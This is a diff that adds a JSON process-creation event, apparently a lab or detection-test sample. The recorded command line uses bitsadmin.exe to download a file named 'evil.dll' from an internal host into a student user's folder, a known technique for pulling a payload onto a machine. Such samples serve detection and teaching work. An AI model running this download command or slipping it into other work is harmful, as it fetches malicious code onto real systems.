@@ -1,0 +1,12 @@
+{
+ "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+ "CommandLine": "bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\\Users\\student\\evil.dll",
+ "OriginalFileName": "BITSADMIN.EXE",
+ "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+ "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+ "User": "LABPC\\student",
+ "IntegrityLevel": "Medium",
+ "Description": "",
+ "Product": "",
+ "Company": ""
+}
